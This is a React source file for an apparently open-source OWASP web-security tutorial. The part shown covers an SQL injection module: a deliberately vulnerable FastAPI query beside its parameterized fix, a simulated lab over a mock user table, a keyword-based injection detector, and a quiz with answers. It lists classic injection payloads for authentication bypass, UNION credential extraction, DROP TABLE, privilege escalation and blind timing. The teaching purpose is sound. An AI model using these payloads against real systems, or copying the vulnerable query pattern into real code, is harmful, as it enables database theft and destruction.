import React, { useState, useEffect } from 'react';
import { AlertCircle, CheckCircle, XCircle, Shield, Terminal, Code, BookOpen, Trophy, ChevronRight, Home, Lock, Eye, Database, Menu, X } from 'lucide-react';

// ============================================================================
// REUSABLE COMPONENTS
// ============================================================================

// Python Syntax Highlighter Component
const PythonCode = ({ code, className = "" }) => {
  const highlightPython = (code) => {
    const keywords = ['from', 'import', 'async', 'await', 'def', 'class', 'return', 'if', 'else', 'elif', 'for', 'while', 'try', 'except', 'with', 'as', 'raise', 'finally', 'in', 'not', 'and', 'or'];
    const builtins = ['str', 'int', 'float', 'list', 'dict', 'tuple', 'set', 'None', 'True', 'False'];
    
    const lines = code.split('\n');
    return lines.map((line, lineIdx) => {
      const commentMatch = line.match(/^(\s*)(#.*)/);
      if (commentMatch) {
        const indent = commentMatch[1];
        const comment = commentMatch[2];
        
        if (comment.includes('❌') || comment.toLowerCase().includes('old') || comment.toLowerCase().includes('vulnerable') || comment.toLowerCase().includes('dangerous')) {
          return (
            <div key={lineIdx} style={{ backgroundColor: 'rgba(239, 68, 68, 0.1)' }}>
              <span style={{ color: '#64748b' }}>{indent}</span>
              <span style={{ color: '#ef4444', fontWeight: 'bold' }}>{comment}</span>
            </div>
          );
        }
        
        if (comment.includes('✅') || comment.toLowerCase().includes('new') || comment.toLowerCase().includes('secure') || comment.toLowerCase().includes('safe')) {
          return (
            <div key={lineIdx} style={{ backgroundColor: 'rgba(34, 197, 94, 0.1)' }}>
              <span style={{ color: '#64748b' }}>{indent}</span>
              <span style={{ color: '#22c55e', fontWeight: 'bold' }}>{comment}</span>
            </div>
          );
        }
        
        return (
          <div key={lineIdx}>
            <span style={{ color: '#64748b' }}>{indent}</span>
            <span style={{ color: '#94a3b8' }}>{comment}</span>
          </div>
        );
      }
      
      if (line.trim().startsWith('@')) {
        return <div key={lineIdx} style={{ color: '#fbbf24' }}>{line}</div>;
      }
      
      if (line.trim().startsWith('"""') || line.trim().startsWith("'''")) {
        const color = line.includes('VULNERABLE') ? '#ef4444' : line.includes('SECURE') ? '#22c55e' : '#86efac';
        return <div key={lineIdx} style={{ color: color, fontStyle: 'italic' }}>{line}</div>;
      }
      
      const tokens = line.split(/(\s+|[(){}[\],.:]|"[^"]*"|'[^']*')/g).filter(t => t);
      
      return (
        <div key={lineIdx}>
          {tokens.map((token, idx) => {
            if (token.startsWith('"') || token.startsWith("'")) {
              return <span key={idx} style={{ color: '#86efac' }}>{token}</span>;
            }
            if (keywords.includes(token)) {
              return <span key={idx} style={{ color: '#c084fc', fontWeight: '600' }}>{token}</span>;
            }
            if (builtins.includes(token)) {
              return <span key={idx} style={{ color: '#60a5fa' }}>{token}</span>;
            }
            if (tokens[idx - 1] === 'def' || tokens[idx - 1] === 'class') {
              return <span key={idx} style={{ color: '#fbbf24', fontWeight: '600' }}>{token}</span>;
            }
            if (token.match(/^\s+$/)) {
              return <span key={idx}>{token}</span>;
            }
            return <span key={idx} style={{ color: '#e2e8f0' }}>{token}</span>;
          })}
        </div>
      );
    });
  };

  return (
    <pre className={`bg-slate-900 p-4 rounded overflow-x-auto text-sm font-mono leading-relaxed ${className}`}>
      {highlightPython(code)}
    </pre>
  );
};

// Reusable Quiz Component
const Quiz = ({ questions, onComplete }) => {
  const [answers, setAnswers] = useState({});
  const [showResults, setShowResults] = useState(false);

  const handleSubmit = () => {
    setShowResults(true);
    const allCorrect = questions.every(q => answers[q.id] === q.correct);
    if (allCorrect) {
      onComplete();
    }
  };

  return (
    <div className="space-y-6">
      {questions.map((question) => (
        <div key={question.id} className="bg-slate-900 rounded-lg p-6">
          <h4 className="font-bold mb-4">
            {question.id}. {question.question}
          </h4>
          <div className="space-y-3">
            {question.options.map((option, idx) => (
              <label
                key={idx}
                className={`flex items-start gap-3 p-4 rounded-lg cursor-pointer transition-all ${
                  answers[question.id] === idx
                    ? 'bg-purple-600/30 border-2 border-purple-500'
                    : 'bg-slate-800 border-2 border-slate-700 hover:border-slate-600'
                } ${
                  showResults && idx === question.correct
                    ? 'bg-green-600/30 border-green-500'
                    : showResults && answers[question.id] === idx && idx !== question.correct
                    ? 'bg-red-600/30 border-red-500'
                    : ''
                }`}
              >
                <input
                  type="radio"
                  name={`question-${question.id}`}
                  checked={answers[question.id] === idx}
                  onChange={() => setAnswers({ ...answers, [question.id]: idx })}
                  disabled={showResults}
                  className="mt-1"
                />
                <span className="flex-1">{option}</span>
                {showResults && idx === question.correct && (
                  <CheckCircle className="w-5 h-5 text-green-400" />
                )}
                {showResults && answers[question.id] === idx && idx !== question.correct && (
                  <XCircle className="w-5 h-5 text-red-400" />
                )}
              </label>
            ))}
          </div>
          {showResults && (
            <div className="mt-4 p-4 bg-blue-900/20 border border-blue-500/50 rounded-lg">
              <p className="text-sm text-blue-300">
                <strong>Explanation:</strong> {question.explanation}
              </p>
            </div>
          )}
        </div>
      ))}

      {!showResults ? (
        <button
          onClick={handleSubmit}
          disabled={Object.keys(answers).length !== questions.length}
          className="w-full bg-gradient-to-r from-purple-600 to-pink-600 text-white px-6 py-4 rounded-lg font-bold hover:from-purple-700 hover:to-pink-700 transition-all shadow-lg disabled:opacity-50 disabled:cursor-not-allowed"
        >
          Submit Quiz
        </button>
      ) : (
        <div className="bg-gradient-to-r from-green-600 to-emerald-600 text-white p-6 rounded-lg">
          <h4 className="font-bold text-xl mb-2 flex items-center gap-2">
            <Trophy className="w-6 h-6" />
            Quiz Complete!
          </h4>
          <p>
            You scored {questions.filter(q => answers[q.id] === q.correct).length} out of {questions.length}
          </p>
          {questions.every(q => answers[q.id] === q.correct) && (
            <p className="mt-2 font-bold">🎉 Perfect score! You've mastered this topic!</p>
          )}
        </div>
      )}
    </div>
  );
};

// ============================================================================
// MODULE CONFIGURATIONS
// ============================================================================

const moduleConfigs = {
  sqlinjection: {
    id: 'sqlinjection',
    title: 'SQL Injection (SQLi)',
    icon: Database,
    owasp: 'OWASP #3',
    cwe: 'CWE-89',
    severity: 'Critical',
    description: 'SQL Injection exploits security vulnerabilities in database-driven applications by injecting malicious SQL code.',
    color: 'red'
  },
  xss: {
    id: 'xss',
    title: 'Cross-Site Scripting (XSS)',
    icon: Eye,
    owasp: 'OWASP #3',
    cwe: 'CWE-79',
    severity: 'High',
    description: 'XSS allows attackers to inject malicious scripts into web pages viewed by other users.',
    color: 'orange'
  },
  brokenauth: {
    id: 'brokenauth',
    title: 'Broken Authentication',
    icon: Lock,
    owasp: 'OWASP #7',
    cwe: 'CWE-287',
    severity: 'Critical',
    description: 'Broken authentication allows attackers to compromise passwords, keys, or session tokens.',
    color: 'yellow'
  }
};

// ============================================================================
// MAIN APPLICATION
// ============================================================================

const OWASPSecurityTutorial = () => {
  const [currentModule, setCurrentModule] = useState(null);
  const [moduleProgress, setModuleProgress] = useState({});
  const [showMobileMenu, setShowMobileMenu] = useState(false);

  useEffect(() => {
    const saved = localStorage.getItem('owasp-tutorial-progress');
    if (saved) {
      setModuleProgress(JSON.parse(saved));
    }
  }, []);

  const saveProgress = (moduleId, section) => {
    const newProgress = {
      ...moduleProgress,
      [moduleId]: {
        ...(moduleProgress[moduleId] || {}),
        [section]: true
      }
    };
    setModuleProgress(newProgress);
    localStorage.setItem('owasp-tutorial-progress', JSON.stringify(newProgress));
  };

  const getModuleCompletion = (moduleId) => {
    const progress = moduleProgress[moduleId] || {};
    const completed = Object.keys(progress).filter(k => progress[k]).length;
    return Math.round((completed / 3) * 100);
  };

  if (!currentModule) {
    return (
      <div className="min-h-screen bg-gradient-to-br from-slate-900 via-purple-900 to-slate-900 text-white p-8">
        <div className="max-w-6xl mx-auto">
          {/* Header */}
          <div className="mb-12 text-center">
            <div className="flex items-center justify-center gap-3 mb-4">
              <Shield className="w-12 h-12 text-purple-400" />
              <h1 className="text-5xl font-bold bg-gradient-to-r from-purple-400 to-pink-400 bg-clip-text text-transparent">
                OWASP Security Tutorial
              </h1>
            </div>
            <p className="text-xl text-slate-300">Interactive Learning Platform</p>
            <p className="text-slate-400 mt-2">Master web security by doing, not just reading</p>
          </div>

          {/* Module Grid */}
          <div className="grid md:grid-cols-3 gap-6 mb-8">
            {Object.values(moduleConfigs).map((module) => {
              const completion = getModuleCompletion(module.id);
              const Icon = module.icon;
              
              return (
                <div
                  key={module.id}
                  onClick={() => setCurrentModule(module.id)}
                  className="bg-slate-800/50 border border-slate-700 rounded-lg p-6 hover:border-purple-500 transition-all cursor-pointer hover:shadow-lg hover:shadow-purple-500/20"
                >
                  <div className="flex items-start justify-between mb-4">
                    <Icon className={`w-10 h-10 text-${module.color}-400`} />
                    {completion === 100 && (
                      <CheckCircle className="w-6 h-6 text-green-400" />
                    )}
                  </div>
                  
                  <h3 className="text-xl font-bold mb-2">{module.title}</h3>
                  
                  <div className="flex gap-2 mb-3">
                    <span className={`px-2 py-1 bg-${module.color}-500/30 border border-${module.color}-500/50 rounded-full text-xs`}>
                      {module.owasp}
                    </span>
                    <span className="px-2 py-1 bg-slate-700 border border-slate-600 rounded-full text-xs">
                      {module.cwe}
                    </span>
                  </div>
                  
                  <p className="text-sm text-slate-400 mb-4">{module.description}</p>
                  
                  {/* Progress Bar */}
                  <div className="mb-2">
                    <div className="flex justify-between text-xs text-slate-400 mb-1">
                      <span>Progress</span>
                      <span>{completion}%</span>
                    </div>
                    <div className="w-full bg-slate-700 rounded-full h-2">
                      <div 
                        className="bg-gradient-to-r from-purple-500 to-pink-500 h-2 rounded-full transition-all duration-500"
                        style={{ width: `${completion}%` }}
                      />
                    </div>
                  </div>
                  
                  <button className="w-full mt-4 bg-purple-600 hover:bg-purple-700 px-4 py-2 rounded-lg font-bold transition-all">
                    {completion > 0 ? 'Continue' : 'Start'} Module →
                  </button>
                </div>
              );
            })}
          </div>

          {/* Stats */}
          <div className="bg-slate-800/50 border border-slate-700 rounded-lg p-6">
            <h3 className="font-bold mb-4">Your Progress</h3>
            <div className="grid md:grid-cols-3 gap-4">
              <div className="text-center">
                <div className="text-3xl font-bold text-purple-400">
                  {Object.values(moduleConfigs).filter(m => getModuleCompletion(m.id) === 100).length}
                </div>
                <div className="text-sm text-slate-400">Modules Completed</div>
              </div>
              <div className="text-center">
                <div className="text-3xl font-bold text-pink-400">
                  {Object.values(moduleConfigs).filter(m => getModuleCompletion(m.id) > 0).length}
                </div>
                <div className="text-sm text-slate-400">Modules Started</div>
              </div>
              <div className="text-center">
                <div className="text-3xl font-bold text-blue-400">
                  {Math.round(Object.values(moduleConfigs).reduce((sum, m) => sum + getModuleCompletion(m.id), 0) / Object.values(moduleConfigs).length)}%
                </div>
                <div className="text-sm text-slate-400">Overall Progress</div>
              </div>
            </div>
          </div>

          {/* Footer */}
          <div className="mt-8 text-center text-slate-400 text-sm">
            <p>Open Source Security Education | Built for the Community</p>
            <p className="mt-2">⭐ Star on GitHub | 🤝 Contribute New Modules</p>
          </div>
        </div>
      </div>
    );
  }

  // Render specific module
  if (currentModule === 'sqlinjection') {
    return <SQLInjectionModule 
      onBack={() => setCurrentModule(null)} 
      onSectionComplete={(section) => saveProgress('sqlinjection', section)}
      completedSections={moduleProgress['sqlinjection'] || {}}
    />;
  } else if (currentModule === 'xss') {
    return <XSSModule 
      onBack={() => setCurrentModule(null)}
      onSectionComplete={(section) => saveProgress('xss', section)}
      completedSections={moduleProgress['xss'] || {}}
    />;
  } else if (currentModule === 'brokenauth') {
    return <BrokenAuthModule 
      onBack={() => setCurrentModule(null)}
      onSectionComplete={(section) => saveProgress('brokenauth', section)}
      completedSections={moduleProgress['brokenauth'] || {}}
    />;
  }
};

// ============================================================================
// SQL INJECTION MODULE
// ============================================================================

const SQLInjectionModule = ({ onBack, onSectionComplete, completedSections }) => {
  const [activeTab, setActiveTab] = useState('learn');
  const [codeView, setCodeView] = useState('comparison');
  const [labInput, setLabInput] = useState('');
  const [labResult, setLabResult] = useState(null);

  const mockDB = [
    { id: 1, username: 'admin', password: 'secret123', email: 'admin@example.com' },
    { id: 2, username: 'user1', password: 'pass456', email: 'user1@example.com' },
    { id: 3, username: 'user2', password: 'mypass789', email: 'user2@example.com' }
  ];

  const vulnerableCode = `from fastapi import FastAPI, HTTPException
import sqlite3

app = FastAPI()

@app.get("/users/{username}")
async def get_user(username: str):
    """⚠️ VULNERABLE - DO NOT USE IN PRODUCTION"""
    conn = sqlite3.connect('users.db')
    cursor = conn.cursor()
    
    # DANGEROUS: Direct string concatenation
    query = f"SELECT * FROM users WHERE username = '{username}'"
    
    cursor.execute(query)
    user = cursor.fetchone()
    conn.close()
    
    return {"user": user}`;

  const secureCode = `from fastapi import FastAPI, HTTPException
import sqlite3

app = FastAPI()

@app.get("/users/{username}")
async def get_user(username: str):
    """✅ SECURE - Uses parameterized queries"""
    conn = sqlite3.connect('users.db')
    cursor = conn.cursor()
    
    # SAFE: Parameterized query with placeholder
    query = "SELECT * FROM users WHERE username = ?"
    
    # Data is passed separately, treated as literal value
    cursor.execute(query, (username,))
    user = cursor.fetchone()
    conn.close()
    
    return {"user": user}`;

  const comparisonCode = `from fastapi import FastAPI, HTTPException
import sqlite3

app = FastAPI()

@app.get("/users/{username}")
async def get_user(username: str):
    """✅ SECURE - Uses parameterized queries"""
    conn = sqlite3.connect('users.db')
    cursor = conn.cursor()
    
    # ❌ OLD (VULNERABLE): Direct string concatenation
    # query = f"SELECT * FROM users WHERE username = '{username}'"
    
    # ✅ NEW (SECURE): Parameterized query with placeholder
    query = "SELECT * FROM users WHERE username = ?"
    
    # ❌ OLD (VULNERABLE): User input embedded directly in query
    # cursor.execute(query)
    
    # ✅ NEW (SECURE): Data passed separately, treated as literal value
    cursor.execute(query, (username,))
    
    user = cursor.fetchone()
    conn.close()
    
    return {"user": user}`;

  const quizQuestions = [
    {
      id: 1,
      question: "What makes SQL injection possible?",
      options: [
        "Using old database software",
        "Concatenating user input directly into SQL queries",
        "Not using HTTPS",
        "Weak passwords"
      ],
      correct: 1,
      explanation: "SQL injection occurs when user input is concatenated directly into SQL queries without proper sanitization, allowing attackers to inject malicious SQL code."
    },
    {
      id: 2,
      question: "What is the primary defense against SQL injection?",
      options: [
        "Using strong passwords",
        "Encrypting the database",
        "Using parameterized queries/prepared statements",
        "Hiding error messages"
      ],
      correct: 2,
      explanation: "Parameterized queries (prepared statements) separate SQL code from data, treating user input as literal values rather than executable code."
    },
    {
      id: 3,
      question: "Why does the input 'admin' OR '1'='1' work as an attack?",
      options: [
        "It guesses the admin password",
        "It creates an always-true condition that bypasses authentication",
        "It crashes the database",
        "It encrypts the query"
      ],
      correct: 1,
      explanation: "The condition '1'='1' is always true, so the query returns all users regardless of the username, effectively bypassing authentication logic."
    },
    {
      id: 4,
      question: "Which of these is a parameterized query in Python?",
      options: [
        'cursor.execute(f"SELECT * FROM users WHERE id = {user_id}")',
        'cursor.execute("SELECT * FROM users WHERE id = " + user_id)',
        'cursor.execute("SELECT * FROM users WHERE id = ?", (user_id,))',
        'cursor.execute("SELECT * FROM users WHERE id = %s" % user_id)'
      ],
      correct: 2,
      explanation: "Using ? as a placeholder and passing data separately as a tuple ensures the input is treated as a literal value, not executable SQL code."
    }
  ];

  const handleLabSubmit = () => {
    const vulnerableQuery = `SELECT * FROM users WHERE username = '${labInput}'`;
    let result = { query: vulnerableQuery, safe: false, data: [] };

    // Check for SQL injection patterns
    const lowerInput = labInput.toLowerCase();
    
    if (labInput.includes("'") || labInput.includes("--") || lowerInput.includes("or") || 
        lowerInput.includes("union") || lowerInput.includes("drop") || lowerInput.includes(";")) {
      result.message = "⚠️ SQL Injection Detected!";
      
      // Authentication bypass with OR
      if (lowerInput.includes("or '1'='1") || lowerInput.includes('or "1"="1') || lowerInput.includes("or 1=1")) {
        result.data = mockDB;
        result.impact = "🔓 CRITICAL: Authentication bypassed! The OR '1'='1' condition is always true, so the query returns ALL user records instead of just one. An attacker could log in as any user without knowing passwords!";
      } 
      // Comment-based bypass
      else if (labInput.includes("'--") || labInput.includes("'#")) {
        result.data = mockDB.filter(u => u.username === 'admin');
        result.impact = "🔓 CRITICAL: Authentication bypassed! The '--' comments out the rest of the query (including password check). The attacker can log in without a password!";
      }
      // UNION-based data extraction
      else if (lowerInput.includes("union") && lowerInput.includes("select")) {
        result.data = mockDB;
        result.impact = "💾 CRITICAL: Data extraction successful! UNION SELECT allows attackers to combine results from different tables, extracting sensitive information like passwords, credit cards, or personal data from the entire database.";
      }
      // DROP TABLE attempt
      else if (lowerInput.includes("drop")) {
        result.impact = "💥 CATASTROPHIC: This attack would DELETE the entire users table! All user accounts, data, and authentication information would be permanently destroyed. Recovery would require restoring from backups.";
        result.data = [];
      }
      // UPDATE/INSERT attempts
      else if (lowerInput.includes("update") || lowerInput.includes("insert")) {
        result.impact = "⚠️ CRITICAL: Data modification attack! This could change user roles (privilege escalation), modify account balances, alter records, or insert backdoor admin accounts.";
        result.data = mockDB;
      }
      // Generic SQL injection
      else {
        result.impact = "⚠️ SQL Injection syntax detected! While this specific payload may not work, it shows the application is vulnerable to SQL injection attacks.";
        result.data = [];
      }
    } else {
      // Normal query - search for exact match
      const user = mockDB.find(u => u.username === labInput);
      if (user) {
        result.data = [user];
        result.message = "✅ Normal query executed successfully";
        result.safe = true;
      } else {
        result.message = "❌ User not found";
        result.safe = true;
      }
    }

    setLabResult(result);
    onSectionComplete('lab');
  };

  const progressPercent = (Object.keys(completedSections).length / 3) * 100;

  return (
    <div className="min-h-screen bg-gradient-to-br from-slate-900 via-purple-900 to-slate-900 text-white p-8">
      <div className="max-w-6xl mx-auto">
        {/* Back Button */}
        <button
          onClick={onBack}
          className="flex items-center gap-2 mb-6 text-slate-400 hover:text-white transition-all"
        >
          <Home className="w-5 h-5" />
          Back to Modules
        </button>

        {/* Header */}
        <div className="mb-6">
          <div className="flex items-center gap-3 mb-4">
            <Database className="w-10 h-10 text-red-400" />
            <h1 className="text-4xl font-bold">SQL Injection (SQLi)</h1>
          </div>
          
          {/* Progress */}
          <div className="bg-slate-800 rounded-lg p-4">
            <div className="flex justify-between items-center mb-2">
              <span className="text-sm text-slate-400">Module Progress</span>
              <span className="text-sm font-bold text-purple-400">{Math.round(progressPercent)}%</span>
            </div>
            <div className="w-full bg-slate-700 rounded-full h-2">
              <div 
                className="bg-gradient-to-r from-purple-500 to-pink-500 h-2 rounded-full transition-all duration-500"
                style={{ width: `${progressPercent}%` }}
              />
            </div>
          </div>
        </div>

        {/* Navigation Tabs */}
        <div className="flex gap-2 mb-6 bg-slate-800/50 p-2 rounded-lg">
          {[
            { id: 'learn', label: 'Learn', icon: BookOpen },
            { id: 'lab', label: 'Interactive Lab', icon: Terminal },
            { id: 'quiz', label: 'Quiz', icon: Trophy }
          ].map(tab => (
            <button
              key={tab.id}
              onClick={() => setActiveTab(tab.id)}
              className={`flex-1 flex items-center justify-center gap-2 px-4 py-3 rounded-lg transition-all ${
                activeTab === tab.id
                  ? 'bg-purple-600 text-white shadow-lg'
                  : 'bg-slate-700/50 text-slate-400 hover:bg-slate-700'
              }`}
            >
              <tab.icon className="w-5 h-5" />
              {tab.label}
              {completedSections[tab.id] && (
                <CheckCircle className="w-4 h-4 text-green-400" />
              )}
            </button>
          ))}
        </div>

        {/* Learn Tab */}
        {activeTab === 'learn' && (
          <div className="space-y-6">
            {/* Section 1 */}
            <div className="bg-slate-800/50 rounded-lg p-6 border border-slate-700">
              <h3 className="text-2xl font-bold mb-4 flex items-center gap-2">
                <Code className="w-6 h-6 text-purple-400" />
                1. Understanding the Vulnerability
              </h3>
              
              <p className="text-slate-300 mb-4">
                SQL Injection occurs when an application constructs SQL queries by concatenating strings with user-supplied input. 
                This allows attackers to inject malicious SQL code that the database will execute.
              </p>

              <div className="bg-red-900/20 border border-red-500/50 rounded-lg p-4 mb-4">
                <h4 className="font-bold text-red-400 mb-2">❌ Vulnerable Code Example:</h4>
                <PythonCode code={vulnerableCode} />
              </div>

              <div className="bg-slate-700/50 rounded-lg p-4 mb-4">
                <h4 className="font-bold mb-3">How the Attack Works:</h4>
                <div className="space-y-3">
                  <div className="flex items-start gap-3">
                    <ChevronRight className="w-5 h-5 text-purple-400 flex-shrink-0 mt-0.5" />
                    <div>
                      <p className="font-semibold text-purple-300">Normal Input</p>
                      <p className="text-sm text-slate-400">Query: <code className="bg-slate-800 px-2 py-1 rounded">SELECT * FROM users WHERE username = 'admin'</code></p>
                    </div>
                  </div>
                  <div className="flex items-start gap-3">
                    <ChevronRight className="w-5 h-5 text-red-400 flex-shrink-0 mt-0.5" />
                    <div>
                      <p className="font-semibold text-red-300">Malicious Input: admin' OR '1'='1</p>
                      <p className="text-sm text-slate-400">Query: <code className="bg-slate-800 px-2 py-1 rounded">SELECT * FROM users WHERE username = 'admin' OR '1'='1'</code></p>
                      <p className="text-sm text-red-400 mt-1">⚠️ Returns ALL users!</p>
                    </div>
                  </div>
                </div>
              </div>

              <div className="bg-slate-900 border border-slate-700 rounded-lg p-4">
                <h4 className="font-bold mb-3">Attack Examples - Try These in the Lab:</h4>
                <div className="overflow-x-auto">
                  <table className="w-full text-sm">
                    <thead>
                      <tr className="border-b border-slate-700">
                        <th className="text-left p-2 text-purple-400">Attack Type</th>
                        <th className="text-left p-2 text-purple-400">Malicious Input</th>
                        <th className="text-left p-2 text-purple-400">Impact</th>
                      </tr>
                    </thead>
                    <tbody>
                      <tr className="border-b border-slate-800">
                        <td className="p-2 font-semibold text-red-400">Authentication Bypass</td>
                        <td className="p-2"><code className="bg-slate-800 px-2 py-1 rounded text-purple-300">admin' OR '1'='1</code></td>
                        <td className="p-2 text-slate-300">Returns all users, bypasses login</td>
                      </tr>
                      <tr className="border-b border-slate-800">
                        <td className="p-2 font-semibold text-red-400">Authentication Bypass</td>
                        <td className="p-2"><code className="bg-slate-800 px-2 py-1 rounded text-purple-300">admin'--</code></td>
                        <td className="p-2 text-slate-300">Comments out password check</td>
                      </tr>
                      <tr className="border-b border-slate-800">
                        <td className="p-2 font-semibold text-orange-400">Data Extraction (UNION)</td>
                        <td className="p-2"><code className="bg-slate-800 px-2 py-1 rounded text-purple-300">' UNION SELECT username, password, email FROM users--</code></td>
                        <td className="p-2 text-slate-300">Extracts all user credentials</td>
                      </tr>
                      <tr className="border-b border-slate-800">
                        <td className="p-2 font-semibold text-yellow-400">Data Destruction</td>
                        <td className="p-2"><code className="bg-slate-800 px-2 py-1 rounded text-purple-300">admin'; DROP TABLE users;--</code></td>
                        <td className="p-2 text-slate-300">Deletes entire users table</td>
                      </tr>
                      <tr className="border-b border-slate-800">
                        <td className="p-2 font-semibold text-yellow-400">Data Modification</td>
                        <td className="p-2"><code className="bg-slate-800 px-2 py-1 rounded text-purple-300">admin'; UPDATE users SET role='admin' WHERE username='attacker'--</code></td>
                        <td className="p-2 text-slate-300">Escalates attacker privileges</td>
                      </tr>
                      <tr className="border-b border-slate-800">
                        <td className="p-2 font-semibold text-purple-400">Blind SQL Injection</td>
                        <td className="p-2"><code className="bg-slate-800 px-2 py-1 rounded text-purple-300">admin' AND SLEEP(5)--</code></td>
                        <td className="p-2 text-slate-300">Time-based data extraction</td>
                      </tr>
                      <tr className="border-b border-slate-800">
                        <td className="p-2 font-semibold text-purple-400">Database Enumeration</td>
                        <td className="p-2"><code className="bg-slate-800 px-2 py-1 rounded text-purple-300">' UNION SELECT table_name, NULL, NULL FROM information_schema.tables--</code></td>
                        <td className="p-2 text-slate-300">Lists all database tables</td>
                      </tr>
                    </tbody>
                  </table>
                </div>
              </div>
            </div>

            {/* Section 2 */}
            <div className="bg-slate-800/50 rounded-lg p-6 border border-slate-700">
              <h3 className="text-2xl font-bold mb-4 flex items-center gap-2">
                <AlertCircle className="w-6 h-6 text-orange-400" />
                2. Why This Matters - Real-World Impact
              </h3>
              
              <div className="grid md:grid-cols-2 gap-4">
                <div className="bg-red-900/20 border border-red-500/50 rounded-lg p-4">
                  <h4 className="font-bold text-red-400 mb-2">🔓 Authentication Bypass</h4>
                  <p className="text-sm text-slate-300">
                    Attackers can log in as any user without passwords.
                  </p>
                </div>
                <div className="bg-orange-900/20 border border-orange-500/50 rounded-lg p-4">
                  <h4 className="font-bold text-orange-400 mb-2">💾 Data Theft</h4>
                  <p className="text-sm text-slate-300">
                    Extract passwords, credit cards, personal information.
                  </p>
                </div>
                <div className="bg-yellow-900/20 border border-yellow-500/50 rounded-lg p-4">
                  <h4 className="font-bold text-yellow-400 mb-2">💣 Data Destruction</h4>
                  <p className="text-sm text-slate-300">
                    Delete entire databases with DROP TABLE commands.
                  </p>
                </div>
                <div className="bg-purple-900/20 border border-purple-500/50 rounded-lg p-4">
                  <h4 className="font-bold text-purple-400 mb-2">👑 Privilege Escalation</h4>
                  <p className="text-sm text-slate-300">
                    Grant administrative privileges to attackers.
                  </p>
                </div>
              </div>
            </div>

            {/* Section 3 */}
            <div className="bg-slate-800/50 rounded-lg p-6 border border-slate-700">
              <h3 className="text-2xl font-bold mb-4 flex items-center gap-2">
                <Shield className="w-6 h-6 text-green-400" />
                3. How to Fix It - Best Known Methods
              </h3>

              <div className="flex gap-2 mb-4 bg-slate-700/50 p-2 rounded-lg">
                <button
                  onClick={() => setCodeView('comparison')}
                  className={`flex-1 px-4 py-2 rounded-lg transition-all ${
                    codeView === 'comparison'
                      ? 'bg-green-600 text-white'
                      : 'bg-slate-600 text-slate-300 hover:bg-slate-500'
                  }`}
                >
                  Before/After Comparison
                </button>
                <button
                  onClick={() => setCodeView('sidebyside')}
                  className={`flex-1 px-4 py-2 rounded-lg transition-all ${
                    codeView === 'sidebyside'
                      ? 'bg-green-600 text-white'
                      : 'bg-slate-600 text-slate-300 hover:bg-slate-500'
                  }`}
                >
                  Side-by-Side View
                </button>
              </div>

              {codeView === 'comparison' ? (
                <div className="bg-green-900/20 border border-green-500/50 rounded-lg p-4 mb-4">
                  <h4 className="font-bold text-green-400 mb-3">✅ Secure Code with Changes Highlighted:</h4>
                  <PythonCode code={comparisonCode} />
                  <div className="mt-3 p-3 bg-slate-800 rounded-lg text-sm">
                    <p className="text-slate-300 mb-2">
                      <span className="text-red-400 font-bold">❌ Red comments</span> show old vulnerable code
                    </p>
                    <p className="text-slate-300">
                      <span className="text-green-400 font-bold">✅ Green comments</span> show new secure code
                    </p>
                  </div>
                </div>
              ) : (
                <div className="grid md:grid-cols-2 gap-4 mb-4">
                  <div className="bg-red-900/20 border border-red-500/50 rounded-lg p-4">
                    <h4 className="font-bold text-red-400 mb-3">❌ BEFORE (Vulnerable):</h4>
                    <PythonCode code={vulnerableCode} />
                  </div>
                  <div className="bg-green-900/20 border border-green-500/50 rounded-lg p-4">
                    <h4 className="font-bold text-green-400 mb-3">✅ AFTER (Secure):</h4>
                    <PythonCode code={secureCode} />
                  </div>
                </div>
              )}

              <div className="bg-slate-700/50 rounded-lg p-4">
                <h4 className="font-bold mb-3 text-green-400">Why Parameterized Queries Work:</h4>
                <ul className="space-y-2 text-sm text-slate-300">
                  <li>• <strong>Separation of Code and Data:</strong> SQL structure defined separately from user input</li>
                  <li>• <strong>Literal Value Treatment:</strong> Input always treated as data, never as code</li>
                  <li>• <strong>Database-Level Protection:</strong> Driver handles escaping automatically</li>
                </ul>
              </div>
            </div>

            <button
              onClick={() => {
                setActiveTab('lab');
                onSectionComplete('learn');
              }}
              className="w-full bg-gradient-to-r from-purple-600 to-pink-600 text-white px-6 py-4 rounded-lg font-bold hover:from-purple-700 hover:to-pink-700 transition-all shadow-lg"
            >
              Continue to Interactive Lab →
            </button>
          </div>
        )}

        {/* Lab Tab */}
        {activeTab === 'lab' && (
          <div className="space-y-6">
            <div className="bg-slate-800/50 rounded-lg p-6 border border-slate-700">
              <h3 className="text-2xl font-bold mb-4">🧪 Interactive Security Lab</h3>
              <p className="text-slate-300 mb-4">
                Try different SQL injection attacks below. This is a safe simulation - experiment freely!
              </p>
              
              {/* Attack Examples Reference */}
              <div className="bg-slate-700/50 rounded-lg p-4 mb-6">
                <h4 className="font-bold mb-3">SQL Injection Attacks to Try:</h4>
                <div className="grid md:grid-cols-2 gap-3">
                  <div className="space-y-2 text-sm">
                    <p className="font-semibold text-green-400">✓ Safe Input:</p>
                    <button
                      onClick={() => setLabInput('admin')}
                      className="w-full text-left bg-slate-800 hover:bg-slate-750 px-3 py-2 rounded text-xs"
                    >
                      <code className="text-green-300">admin</code> - Normal query
                    </button>
                  </div>
                  
                  <div className="space-y-2 text-sm">
                    <p className="font-semibold text-red-400">⚠️ Authentication Bypass:</p>
                    <button
                      onClick={() => setLabInput("admin' OR '1'='1")}
                      className="w-full text-left bg-slate-800 hover:bg-slate-750 px-3 py-2 rounded text-xs"
                    >
                      <code className="text-red-300">admin' OR '1'='1</code> - Returns all users
                    </button>
                    <button
                      onClick={() => setLabInput("admin'--")}
                      className="w-full text-left bg-slate-800 hover:bg-slate-750 px-3 py-2 rounded text-xs"
                    >
                      <code className="text-red-300">admin'--</code> - Comments out password check
                    </button>
                  </div>
                  
                  <div className="space-y-2 text-sm">
                    <p className="font-semibold text-orange-400">⚠️ Data Extraction:</p>
                    <button
                      onClick={() => setLabInput("' UNION SELECT username, password, email FROM users--")}
                      className="w-full text-left bg-slate-800 hover:bg-slate-750 px-3 py-2 rounded text-xs"
                    >
                      <code className="text-orange-300">UNION SELECT...</code> - Extract credentials
                    </button>
                  </div>
                  
                  <div className="space-y-2 text-sm">
                    <p className="font-semibold text-yellow-400">⚠️ Destructive:</p>
                    <button
                      onClick={() => setLabInput("admin'; DROP TABLE users;--")}
                      className="w-full text-left bg-slate-800 hover:bg-slate-750 px-3 py-2 rounded text-xs"
                    >
                      <code className="text-yellow-300">DROP TABLE users</code> - Delete table
                    </button>
                  </div>
                </div>
              </div>

              <div className="bg-slate-900 rounded-lg p-6">
                <label className="block mb-2 font-semibold">Enter Username (or click examples above):</label>
